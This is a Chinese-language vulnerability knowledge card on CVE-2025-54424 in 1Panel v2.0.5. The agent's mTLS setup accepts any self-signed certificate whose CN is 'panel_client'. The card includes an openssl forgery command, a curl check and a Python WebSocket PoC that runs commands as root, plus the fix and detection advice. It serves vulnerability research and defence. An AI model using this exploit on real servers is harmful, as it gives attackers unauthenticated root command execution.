---
id: web-generic-auth-1panel-mtls-cn-cert-forgery-rce
title: 1Panel Agent mTLS 只验 CN 不验签发者：自签名证书伪造 panel_client 打通终端 WebSocket RCE
type: scenario
domain: web
path: web/generic/auth
technique: mtls-require-any-client-cert-cn-forgery
aliases:
- 1Panel 未授权 RCE
- RequireAnyClientCert 绕过
- CN=panel_client 证书伪造
- mTLS 客户端证书认证绕过
- Agent WebSocket 命令执行
- CVE-2025-54424
tags:
- mtls
- tls
- client-certificate
- auth-bypass
- websocket
- rce
- golang
- 1panel
- cve-2025-54424
cve:
- CVE-2025-54424
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
affected_versions: 1Panel v2.0.5（官方修复版本 2.0.6）
verification:
  verified_by: verifier-V20
  verified_at: '2026-11-05T02:16:49+08:00'
  notes: 已通读原文并逐张核对14张图：图01 通告确认 CVE-2025-54424、修复版本 2.0.6、RequireAnyClientCert→RequireAndVerifyClientCert；图04/05/06 一体化脚本与 Burp 均以 CN=panel_client 自签名证书连 /api/v2/hosts/terminal，whoami 返回 root；图12 server.go 的 RequireAnyClientCert、图13 WsMsg Base64 cmd、图14 修复 diff 与卡内一致。affected_versions 已按原文/通告填 1Panel v2.0.5（修复 2.0.6）。PoC 未在本机复跑；frontmatter 无 sources/source_url。
---

## 一句话结论

1Panel v2.0.5 的 agent 端 TLS 配置为 `tls.RequireAnyClientCert`：它要求客户端提供证书，但不校验证书是否由可信 CA 签发；应用层只检查证书 `Subject.CommonName == "panel_client"`。攻击者用任意自签名证书把 CN 设为 `panel_client` 即可通过全部校验，随后连接 `/api/v2/hosts/terminal` WebSocket，发送 `{"type":"cmd","data":"<base64 命令>"}` 即可以 agent 权限（通常为 root）执行任意命令。

## 原理

- Go `crypto/tls` 的 `ClientAuth` 有多个档位：
  - `NoClientCert`：不要求证书；
  - `RequestClientCert`：请求但不强制；
  - `RequireAnyClientCert`：**要求提供证书，但不验证证书链/签发者**；
  - `VerifyClientCertIfGiven`：提供了才验证；
  - `RequireAndVerifyClientCert`：要求并提供 CA 池进行验证。
  `RequireAnyClientCert` 只保证“有证书”，自签名证书也能完成握手，因此不能作为身份认证。
- 应用层中间件只做了弱校验：
  ```go
  if !c.Request.TLS.HandshakeComplete || len(c.Request.TLS.PeerCertificates) == 0 {
      // 拒绝
  }
  cert := c.Request.TLS.PeerCertificates[0]
  if cert.Subject.CommonName != "panel_client" {
      // 拒绝
  }
  conn := c.Request.Header.Get("Connection")
  if conn == "Upgrade" {
      c.Next()
      return
  }
  // 再比对 Proxy-Id 与 /etc/1panel/.nodeProxyID
  ```
  `PeerCertificates[0]` 来自客户端自报的证书链；`Subject.CommonName` 完全由证书生成者控制。攻击者执行 `openssl req ... -subj "/CN=panel_client"` 生成的证书即可满足。
- 证书 CN 在这里被当成“共享密钥/服务身份”使用，但它既不是秘密，也没有密码学绑定；任何人都能签一张同 CN 的证书。
- `/api/v2` 私有路由组在非 master 节点上挂 `middleware.Certificate()`，通过后即可访问 agent 的全部私有接口，包括 WebSocket。
- 终端接口 `GET /api/v2/hosts/terminal`（`Connection: Upgrade`）建立 WebSocket 后，服务端按 JSON 消息处理：`type=cmd` 时把 `data` 按 Base64 解码为命令，交给本地 shell 执行，再把输出 Base64 编码回传。该接口本身没有二次认证，依赖的正是前面被绕过的证书中间件。
- 因此整条链是“TLS 层不验签 → 应用层只验可伪造的 CN → 私有 WebSocket 终端直接执行命令”，属于认证边界设计错误，而非某个命令注入参数。

## 触发条件

- 目标为 1Panel v2.0.5（或使用相同 TLS 配置的版本）；已修复版本为 2.0.6。
- 能够访问 agent 的 HTTPS/WebSocket 端口（原文环境为 9999，面板端口与 agent 端口可能不同）。
- agent 未通过防火墙/网络策略限制来源；攻击者能完成 TLS 握手。
- 攻击者能生成自签名证书并设置 CN（任何 openssl/python 环境均可）。
- 目标节点为非 master（`!global.IsMaster` 才走 Certificate 中间件）；master 节点直接放行，但通常不暴露同样端口。

## 利用步骤

1. 生成自签名客户端证书与私钥，CN 固定为 `panel_client`：
   ```bash
   openssl req -x509 -newkey rsa:2048 \
     -keyout panel_client.key -out panel_client.crt \
     -days 365 -nodes -subj "/CN=panel_client"
   ```
2. 用该证书向 agent 发一个普通 HTTPS 请求验证认证是否通过，例如：
   ```bash
   curl -k --cert panel_client.crt --key panel_client.key \
     https://target:9999/api/v2/dashboard/base/os
   ```
   若返回 200/正常 JSON 而不是 TLS 错误或“err certificate”，说明伪造证书已被接受。
3. 建立 WebSocket TLS 连接：
   ```text
   wss://target:9999/api/v2/hosts/terminal
   ```
   请求头需包含 `Connection: Upgrade`、`Upgrade: websocket` 等标准握手头。
4. 发送命令帧，命令先做 Base64：
   ```json
   {"type":"cmd","data":"d2hvbWFp"}
   ```
   （`d2hvbWFp` 为 `whoami` 的 Base64；不要带多余字符。）
5. 读取返回帧，`data` 为 Base64 编码的命令输出；原文实测返回 `root`，证明以 root 权限执行。
6. 可继续用 `type=ps`、`type=net` 等消息读取进程/网络信息；`/api/v2/process/ws` 也可泄露进程等敏感信息。

## PoC

证书生成（openssl）：

```bash
openssl req -x509 -newkey rsa:2048 -keyout panel_client.key -out panel_client.crt \
  -days 365 -nodes -subj "/CN=panel_client"
```

Python 验证与命令执行（依赖 `websocket-client`）：

```python
import ssl, base64, json, websocket

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE          # 测试环境服务端也可能是自签名
ctx.load_cert_chain("panel_client.crt", "panel_client.key")

ws = websocket.create_connection(
    "wss://target:9999/api/v2/hosts/terminal",
    sslopt={"context": ctx},
)
cmd = "whoami"
ws.send(json.dumps({"type": "cmd", "data": base64.b64encode(cmd.encode()).decode()}))
print(base64.b64decode(ws.recv()).decode(errors="replace"))
```

原始 WebSocket 帧：

```json
{"type":"cmd","data":"d2hvbWFp"}
```

返回示例（Base64 解码后）：

```text
root
```

说明：原文用一体化脚本与 Burp WebSocket 两种方式验证，均成功执行 `whoami` 并返回 root；HTTPS 预检返回 200 即确认存在漏洞。

## 变体与关联

- **其他 agent 私有接口**：证书中间件通过后，`/api/v2/process/ws`（进程/SSH/网络/wget 信息）、`/api/v2/hosts/terminal`（命令执行）等都可直接访问；具体路由随版本变化，以实际二进制/源码为准。
- **中间件绕过细节**：`if conn == "Upgrade" { c.Next() }` 在 CN 校验之后，不能绕过 CN；`Proxy-Id` 比对仅在 `/etc/1panel/.nodeProxyID` 存在且非空时生效，与本漏洞无关。
- **同类 mTLS 缺陷**：任何使用 `RequireAnyClientCert` + 仅检查 CN/SAN 字符串的服务都会中招；CN 可被任意自签名证书伪造，必须结合 `ClientCAs` 验证签发链。
- **修复方式**：将 `ClientAuth` 改为 `tls.RequireAndVerifyClientCert`，并设置 `ClientCAs` 为服务端签发的根证书池；这是官方 2.0.6 的修复方向。
- **与 WebSocket 相关卡的关系**：本卡是“认证绕过 + WebSocket 命令通道”的组合；WebSocket 层本身的消息注入/跨站劫持见 WebSocket 路径。

## 检测与防御

- 服务端：禁用 `RequireAnyClientCert`，改用 `RequireAndVerifyClientCert` + `ClientCAs`；校验证书链、有效期、SAN/CN 与业务身份的绑定，不能把 CN 当共享密钥。
- 证书生命周期：为每个 agent 签发独立证书并由服务端 CA 管理，支持吊销/轮换；不要接受自签名证书。
- 网络：agent 端口仅对 master/管理网开放，禁止公网暴露；默认端口 9999 不应直接可达。
- 监控：TLS 握手中出现 CN=`panel_client` 的自签名/未知签发者证书；短时间大量证书认证请求；WebSocket 终端连接与 Base64 命令帧。
- 升级：升级到 1Panel 2.0.6 及以上；升级后验证 `ClientAuth` 与 `ClientCAs` 配置生效。
- 审计：搜索 Go 代码中的 `tls.Config{ClientAuth: tls.RequireAnyClientCert}`、只比较 `Subject.CommonName` 的中间件，以及 WebSocket 中 `exec.Command`/shell 调用点。
